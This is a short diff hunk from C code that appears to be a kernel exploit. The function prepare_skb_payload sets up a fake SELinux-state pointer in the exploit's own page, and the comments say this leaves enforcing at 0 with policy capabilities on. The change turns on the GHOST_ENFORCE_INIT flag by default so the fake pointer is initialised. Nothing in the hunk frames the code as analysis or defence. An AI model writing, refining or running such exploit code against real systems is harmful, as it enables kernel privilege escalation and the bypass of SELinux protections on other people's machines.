@@ -810,7 +810,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
            * SELFTEST scratch area of our own page. policycap[0..4] get
            * the pointer's upper bytes (nonzero -> caps enabled), which
            * is harmless while enforcing=0. */
-          if (env_flag("GHOST_ENFORCE_INIT", 0)) {
+          if (env_flag("GHOST_ENFORCE_INIT", 1)) {
             fake_right = payload_base + SELFTEST_OFF;
             pr_info("selinux write value=%016zx (page-aligned, keep initialized)\n",
                     (size_t)fake_right);
